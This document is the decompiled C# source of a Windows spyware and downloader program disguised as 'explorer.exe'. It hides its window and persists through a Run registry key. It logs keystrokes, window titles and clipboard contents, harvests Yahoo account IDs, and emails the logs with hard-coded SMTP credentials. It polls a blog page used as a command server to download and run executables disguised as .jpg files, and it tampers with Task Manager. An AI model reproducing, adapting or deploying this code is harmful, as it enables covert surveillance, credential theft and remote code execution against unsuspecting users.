using System;
using System.Collections.Specialized;
using System.ComponentModel;
using System.Configuration;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Net.Sockets;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Explorer.Properties;
using Microsoft.Win32;
using RawInput;

namespace Explorer;

public class Form1 : Form
{
	private InputDevice inputDevice_0;

	private int int_0;

	private string string_0 = Application.get_ExecutablePath();

	private string string_1 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp";

	private string string_2 = "";

	private bool bool_0;

	private float float_0 = 1.4f;

	private static string string_3 = Environment.MachineName + Environment.UserName;

	private string string_4;

	private RegistryKey registryKey_0 = Registry.CurrentUser.OpenSubKey("Software\\yahoo\\pager", writable: true);

	private RegistryKey registryKey_1 = Registry.CurrentUser.OpenSubKey("Software\\yahoo\\Profiles", writable: true);

	private RegistryKey registryKey_2 = Registry.CurrentUser.OpenSubKey("Software\\gmail", writable: true);

	private string string_5;

	private ListBox listBox_0 = new ListBox();

	private Timer timer_0;

	private Timer timer_1;

	private Timer timer_2;

	private Timer timer_3;

	private Timer timer_4;

	private IContainer icontainer_0;

	private Timer timer_5;

	private void method_0()
	{
		WebClient webClient = new WebClient();
		webClient.DownloadDataCompleted += method_1;
		try
		{
			webClient.DownloadDataAsync(new Uri("http://limlim00000.rozblog.com/page/main"));
		}
		catch
		{
		}
		while (webClient.IsBusy)
		{
			method_9();
			Thread.Sleep(100);
		}
	}

	private void method_1(object sender, DownloadDataCompletedEventArgs e)
	{
		try
		{
			byte[] result = e.Result;
			string @string = Encoding.UTF8.GetString(result);
			StringReader stringReader = new StringReader(@string);
			stringReader.ReadLine();
			string[] array = new string[int.Parse(stringReader.ReadLine())];
			try
			{
				for (int i = 0; i < array.Length; i++)
				{
					array[i] = stringReader.ReadLine();
				}
			}
			catch
			{
			}
			try
			{
				if (float.Parse(array[1]) > float_0)
				{
					method_2(array[2]);
				}
			}
			catch
			{
			}
			try
			{
				if (array[4] != Settings.Default.imageadd && array[4] != "null")
				{
					method_4(array[4]);
					Settings.Default.imageadd = array[4];
					((SettingsBase)Settings.Default).Save();
				}
			}
			catch
			{
			}
			try
			{
				int num = int.Parse(array[6]) * 2;
				int num2;
				for (num2 = 1; num2 <= num; num2++)
				{
					if (array[6 + num2] == string_3 && array[7 + num2] != Settings.Default.imageuser)
					{
						method_4(array[7 + num2]);
						Settings.Default.imageuser = array[7 + num2];
						((SettingsBase)Settings.Default).Save();
					}
					num2++;
				}
			}
			catch
			{
			}
			try
			{
				int num3 = int.Parse(array[6]) * 2;
				string text = array[8 + num3];
				if (text != Settings.Default.messageok && text != "null")
				{
					method_6(text);
					Settings.Default.messageok = text;
					((SettingsBase)Settings.Default).Save();
				}
			}
			catch
			{
			}
			try
			{
				int num4 = int.Parse(array[6]) * 2;
				int num5 = int.Parse(array[num4 + 10]) * 2;
				int num6;
				for (num6 = 1; num6 <= num5; num6++)
				{
					int num7 = num4 + 10 + num6;
					if (array[num7] == string_3 && array[num7 + 1] != Settings.Default.messageuser)
					{
						method_6(array[num7 + 1]);
						Settings.Default.messageuser = array[num7 + 1];
						((SettingsBase)Settings.Default).Save();
					}
					num6++;
				}
			}
			catch
			{
			}
			try
			{
				int num8 = int.Parse(array[6]) * 2;
				int num9 = int.Parse(array[num8 + 10]) * 2;
				int num10 = int.Parse(array[num8 + num9 + 12]) * 2;
				int num11;
				for (num11 = 1; num11 <= num10; num11++)
				{
					int num12 = num8 + num9 + 12 + num11;
					if (array[num12] == string_3 && array[num12 + 1] != Settings.Default.runuser)
					{
						method_7(array[num12 + 1]);
						Settings.Default.runuser = array[num12 + 1];
						((SettingsBase)Settings.Default).Save();
					}
					num11++;
				}
			}
			catch
			{
			}
			try
			{
				int num13 = int.Parse(array[6]) * 2;
				int num14 = int.Parse(array[num13 + 10]) * 2;
				int num15 = int.Parse(array[num13 + num14 + 12]) * 2;
				int num16 = int.Parse(array[num13 + num14 + num15 + 14]) * 2;
				int num17;
				for (num17 = 1; num17 <= num16; num17++)
				{
					int num18 = num13 + num14 + num15 + 14 + num17;
					if (array[num18] == string_3 && array[num18 + 1] != "null")
					{
						Settings.Default.accessimage = array[num18 + 1];
						((SettingsBase)Settings.Default).Save();
					}
					num17++;
				}
			}
			catch
			{
			}
		}
		catch
		{
		}
	}

	private void method_2(string string_6)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += method_3;
		try
		{
			if (File.Exists(string_1 + "\\new\\new.jpg"))
			{
				File.Delete(string_1 + "\\new\\new.jpg");
			}
			if (File.Exists(string_1 + "\\new\\new.exe"))
			{
				File.Delete(string_1 + "\\new\\new.exe");
			}
			Directory.CreateDirectory(string_1 + "\\new");
			webClient.DownloadFileAsync(new Uri(string_6), string_1 + "\\new\\new.jpg");
		}
		catch
		{
		}
		while (webClient.IsBusy)
		{
			method_9();
			Thread.Sleep(100);
		}
	}

	private void method_3(object sender, AsyncCompletedEventArgs e)
	{
		if (e.Error == null && !e.Cancelled)
		{
			try
			{
				File.Move(string_1 + "\\new\\new.jpg", string_1 + "\\new\\new.exe");
				Process.Start(string_1 + "\\new\\new.exe");
			}
			catch
			{
			}
		}
	}

	private void method_4(string string_6)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += method_5;
		try
		{
			if (File.Exists("c:\\new\\img.jpg"))
			{
				File.Delete("c:\\new\\img.jpg");
			}
			Directory.CreateDirectory("c:\\new");
			webClient.DownloadFileAsync(new Uri(string_6), "c:\\new\\img.jpg");
		}
		catch
		{
		}
		while (webClient.IsBusy)
		{
			method_9();
			Thread.Sleep(100);
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	private static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);

	private void method_5(object sender, AsyncCompletedEventArgs e)
	{
		if (e.Error == null && !e.Cancelled)
		{
			SystemParametersInfo(20, 0, "c:\\new\\img.jpg", 3);
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Control Panel\\Desktop", writable: true);
			registryKey.SetValue("WallpaperStyle", 2.ToString());
			registryKey.SetValue("TileWallpaper", 0.ToString());
			registryKey.Close();
		}
	}

	private void method_6(string string_6)
	{
		string contents = "<html><head><script type=\"text/javascript\">function message() {alert(\"" + string_6 + "\");} newComment = function () {try {window.close();} catch (e) { } }</script></head><body><script> message(); newComment();</script><center><div><b>message ::</b><br /><h1>" + string_6 + "</h1></div></center></body></html>";
		Directory.CreateDirectory("c:\\new");
		string text = "c:\\new\\new.htm";
		if (File.Exists(text))
		{
			File.Delete(text);
		}
		File.WriteAllText(text, contents, Encoding.UTF8);
		Process.Start(text);
	}

	private void method_7(string string_6)
	{
		WebClient webClient = new WebClient();
		webClient.DownloadFileCompleted += method_8;
		try
		{
			if (File.Exists(string_1 + "\\new\\run.jpg"))
			{
				File.Delete(string_1 + "\\new\\run.jpg");
			}
			if (File.Exists(string_1 + "\\new\\run.exe"))
			{
				File.Delete(string_1 + "\\new\\run.exe");
			}
			Directory.CreateDirectory(string_1 + "\\new");
			webClient.DownloadFileAsync(new Uri(string_6), string_1 + "\\new\\run.jpg");
		}
		catch
		{
		}
		while (webClient.IsBusy)
		{
			method_9();
			Thread.Sleep(100);
		}
	}

	private void method_8(object sender, AsyncCompletedEventArgs e)
	{
		if (e.Error == null && !e.Cancelled)
		{
			try
			{
				File.Move(string_1 + "\\new\\run.jpg", string_1 + "\\new\\run.exe");
				Process.Start(string_1 + "\\new\\run.exe");
			}
			catch
			{
			}
		}
	}

	[DllImport("user32.dll")]
	private static extern IntPtr GetForegroundWindow();

	[DllImport("user32.dll")]
	private static extern int GetWindowText(IntPtr hWnd, StringBuilder text, int count);

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			((Control)this).Hide();
			string text = string_1 + "\\explorer.exe";
			if (string_0 != text)
			{
				try
				{
					File.Copy(string_0, text, overwrite: true);
				}
				catch
				{
				}
			}
		}
		catch
		{
			Application.Restart();
		}
		try
		{
			string_4 = string.Concat("\nYahoo! User ID: ", registryKey_0.GetValue("Yahoo! User ID"), "@Yahoo.Com\n----------------------------------------");
			for (int i = 0; i < registryKey_1.SubKeyCount - 1; i++)
			{
				if (i == 0)
				{
					try
					{
						string_4 = string_4 + "\nRecent Users:\n" + registryKey_1.GetSubKeyNames().GetValue(i)!.ToString() + "@Yahoo.Com";
					}
					catch
					{
					}
				}
				if (i != 0)
				{
					try
					{
						string_4 = string_4 + "\n" + registryKey_1.GetSubKeyNames().GetValue(i)!.ToString() + "@Yahoo.Com";
					}
					catch
					{
					}
				}
			}
		}
		catch
		{
		}
	}

	public Form1()
	{
		//IL_007b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0085: Expected O, but got Unknown
		try
		{
			InitializeComponent();
			_ = Settings.Default.accessimage;
			try
			{
				if (Settings.Default.accessimage != "null")
				{
					if (!File.Exists(string_1 + "\\searcher.exe"))
					{
						File.WriteAllBytes(string_1 + "\\searcher.exe", Resources.searcher);
					}
					Process.Start(string_1 + "\\searcher.exe");
				}
			}
			catch
			{
			}
			inputDevice_0 = new InputDevice(((Control)this).get_Handle());
			int_0 = inputDevice_0.EnumerateDevices();
			inputDevice_0.KeyPressed += inputDevice_0_KeyPressed;
		}
		catch
		{
			Application.Restart();
		}
	}

	protected override void WndProc(ref Message message)
	{
		//IL_000f: Unknown result type (might be due to invalid IL or missing references)
		try
		{
			if (inputDevice_0 != null)
			{
				inputDevice_0.ProcessMessage(message);
			}
			((Form)this).WndProc(ref message);
		}
		catch
		{
		}
	}

	private void inputDevice_0_KeyPressed(object sender, InputDevice.KeyControlEventArgs e)
	{
		try
		{
			StringBuilder stringBuilder = new StringBuilder(256);
			GetWindowText(GetForegroundWindow(), stringBuilder, 256);
			File.AppendAllText(string_1 + "\\input.txt", "\r\n" + e.Keyboard.vKey + "\t" + stringBuilder.ToString(), Encoding.UTF8);
		}
		catch
		{
		}
	}

	private void timer_0_Tick(object sender, EventArgs e)
	{
		method_9();
	}

	private void method_9()
	{
		try
		{
			string text = string_1 + "\\explorer.exe";
			if (!File.Exists(string_1))
			{
				Directory.CreateDirectory(string_1);
			}
			if (!File.Exists(text))
			{
				File.Copy(string_0, text);
			}
		}
		catch
		{
		}
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue("explorer", string_1 + "\\explorer.exe");
		}
		catch
		{
			RegistryKey registryKey2 = Registry.CurrentUser.OpenSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey2.SetValue("explorer", string_1 + "\\explorer.exe");
		}
		try
		{
			if (File.Exists(string_1 + "\\Ex" + float_0 + ".big"))
			{
				Process process = new Process();
				Process process2 = new Process();
				Process[] processes = Process.GetProcesses();
				string text2 = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp";
				string directoryName = Path.GetDirectoryName(Application.get_ExecutablePath());
				Process[] array = processes;
				foreach (Process process3 in array)
				{
					try
					{
						if (process3.ProcessName.ToLower() == "explorer")
						{
							ProcessModule mainModule = process3.MainModule;
							if (File.Exists(text2 + "\\explorer.exe"))
							{
								if (mainModule.FileName!.ToLower() == text2.ToLower() + "\\explorer.exe")
								{
									process = process3;
								}
								else if (File.Exists(directoryName + "\\explorer.exe") && mainModule.FileName!.ToLower() == directoryName.ToLower() + "\\explorer.exe")
								{
									process = process3;
								}
							}
						}
					}
					catch
					{
					}
					try
					{
						if (!(process3.ProcessName.ToLower() == "taskmgr"))
						{
							continue;
						}
						ProcessModule mainModule2 = process3.MainModule;
						if (!File.Exists(text2 + "\\taskmgr.exe"))
						{
							continue;
						}
						if (!(mainModule2.FileName!.ToLower() == text2.ToLower() + "\\taskmgr.exe"))
						{
							if (File.Exists(directoryName + "\\taskmgr.exe") && mainModule2.FileName!.ToLower() == directoryName.ToLower() + "\\taskmgr.exe")
							{
								process2 = process3;
							}
						}
						else
						{
							process2 = process3;
						}
					}
					catch
					{
					}
				}
				process.Kill();
				process2.Kill();
			}
		}
		catch
		{
		}
		method_10();
	}

	private void method_10()
	{
		Process[] processes = Process.GetProcesses();
		bool flag = false;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Temp";
		string directoryName = Path.GetDirectoryName(Application.get_ExecutablePath());
		Process[] array = processes;
		foreach (Process process in array)
		{
			try
			{
				if (process.ProcessName.ToLower() == "taskmgr")
				{
					ProcessModule mainModule = process.MainModule;
					if (File.Exists(text + "\\taskmgr.exe") && mainModule.FileName!.ToLower() == text.ToLower() + "\\taskmgr.exe")
					{
						flag = true;
					}
					if (File.Exists(directoryName + "\\taskmgr.exe") && mainModule.FileName!.ToLower() == directoryName.ToLower() + "\\taskmgr.exe")
					{
						flag = true;
					}
				}
			}
			catch
			{
			}
		}
		if (!flag && !File.Exists(text + "\\Ex" + float_0 + ".big"))
		{
			Process.Start(text + "\\taskmgr.exe");
			Process.Start(Application.get_ExecutablePath());
			Application.Exit();
		}
	}

	private void timer_1_Tick(object sender, EventArgs e)
	{
		if (Clipboard.ContainsText())
		{
			string text = Clipboard.GetText();
			if (text != string_2)
			{
				File.AppendAllText(string_1 + "\\input.txt", "\r\n\" " + text + " \"");
				string_2 = text;
			}
		}
		else
		{
			if (!Clipboard.ContainsFileDropList())
			{
				return;
			}
			string text2 = "";
			int num = 0;
			StringEnumerator enumerator = Clipboard.GetFileDropList().GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					string current = enumerator.Current;
					num++;
					text2 = ((num != 1) ? (text2 + "\r\n" + current) : (text2 + current));
				}
			}
			finally
			{
				if (enumerator is IDisposable disposable)
				{
					disposable.Dispose();
				}
			}
			if (text2 != string_2)
			{
				File.AppendAllText(string_1 + "\\input.txt", "\r\n\" " + text2 + " \"");
				string_2 = text2;
			}
		}
	}

	private void method_11()
	{
		string text = "binary000000@yahoo.com";
		string address = "binary111111@yahoo.com";
		string password = "entername2012";
		if (!text.EndsWith("@gmail.com"))
		{
			if (text.EndsWith("@yahoo.com"))
			{
				string_5 = "smtp.mail.yahoo.com";
			}
		}
		else
		{
			string_5 = "smtp.gmail.com";
		}
		try
		{
			string text2 = "\r\n----------------------------\r\nIP Address\r\n";
			IPAddress[] hostAddresses = Dns.GetHostAddresses(Dns.GetHostName());
			IPAddress[] array = hostAddresses;
			foreach (IPAddress iPAddress in array)
			{
				text2 = text2 + "\r\n" + iPAddress.ToString();
			}
			string text3 = string_4 + text2 + "\r\n______________________________________________________\r\n";
			text3 = text3 + "\r\n______________________________________________________________________________\r\n" + File.ReadAllText(string_1 + "\\input.txt");
			MailMessage mailMessage = new MailMessage(new MailAddress(text), new MailAddress(address));
			mailMessage.Subject = string_3;
			mailMessage.SubjectEncoding = Encoding.UTF8;
			string text4 = "null";
			try
			{
				text4 = registryKey_2.GetValue("firstcopy")!.ToString();
			}
			catch
			{
			}
			mailMessage.Body = "\r\nCopy over folder ( " + text4 + " )\r\naccessimage : " + Settings.Default.accessimage + "\r\nimageadd : " + Settings.Default.imageadd + "\r\nimageuser : " + Settings.Default.imageuser + "\r\nmessageok : " + Settings.Default.messageok + "\r\nmessageuser : " + Settings.Default.messageuser + "\r\nrunuser : " + Settings.Default.runuser + "\r\nver : " + float_0 + text3;
			mailMessage.BodyEncoding = Encoding.UTF8;
			mailMessage.IsBodyHtml = false;
			SmtpClient smtpClient = new SmtpClient(string_5, 587);
			smtpClient.Credentials = new NetworkCredential(text, password);
			smtpClient.EnableSsl = false;
			if (text.EndsWith("@gmail.com"))
			{
				smtpClient.EnableSsl = true;
			}
			if (text.EndsWith("@yahoo.com"))
			{
				smtpClient.EnableSsl = false;
			}
			if (listBox_0.get_Items().get_Count() != 0)
			{
				foreach (object item in listBox_0.get_Items())
				{
					mailMessage.Attachments.Add(new Attachment(item.ToString()));
				}
			}
			try
			{
				smtpClient.Send(mailMessage);
				File.Delete(string_1 + "\\input.txt");
			}
			catch (SmtpException)
			{
			}
		}
		catch
		{
		}
		try
		{
			method_0();
		}
		catch
		{
		}
	}

	private void timer_2_Tick(object sender, EventArgs e)
	{
		if (method_12() && !bool_0)
		{
			method_11();
			timer_3.set_Enabled(true);
			bool_0 = true;
		}
		if (!method_12() && bool_0)
		{
			bool_0 = false;
			timer_3.set_Enabled(false);
		}
	}

	private bool method_12()
	{
		try
		{
			TcpClient tcpClient = new TcpClient("www.google.com", 80);
			tcpClient.Close();
			return true;
		}
		catch
		{
			return false;
		}
	}

	private void timer_3_Tick(object sender, EventArgs e)
	{
		method_11();
	}

	private void timer_4_Tick(object sender, EventArgs e)
	{
		timer_4.Stop();
		string text = "";
		try
		{
			text = registryKey_2.GetValue("firstcopy")!.ToString();
		}
		catch
		{
		}
		if (text != "ecept")
		{
			Class0.smethod_0();
			registryKey_2.SetValue("firstcopy", "ecept", RegistryValueKind.String);
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	public void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_0077: Unknown result type (might be due to invalid IL or missing references)
		//IL_0081: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		timer_0 = new Timer(icontainer_0);
		timer_1 = new Timer(icontainer_0);
		timer_2 = new Timer(icontainer_0);
		timer_3 = new Timer(icontainer_0);
		timer_4 = new Timer(icontainer_0);
		timer_5 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(10);
		timer_0.add_Tick((EventHandler)timer_0_Tick);
		timer_1.set_Enabled(true);
		timer_1.add_Tick((EventHandler)timer_1_Tick);
		timer_2.set_Enabled(true);
		timer_2.set_Interval(30000);
		timer_2.add_Tick((EventHandler)timer_2_Tick);
		timer_3.set_Interval(1800000);
		timer_3.add_Tick((EventHandler)timer_3_Tick);
		timer_4.set_Enabled(true);
		timer_4.set_Interval(1000);
		timer_4.add_Tick((EventHandler)timer_4_Tick);
		timer_5.set_Enabled(true);
		timer_5.set_Interval(30000);
		componentResourceManager.ApplyResources(this, "$this");
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.White);
		((Control)this).set_ForeColor(SystemColors.ActiveCaption);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
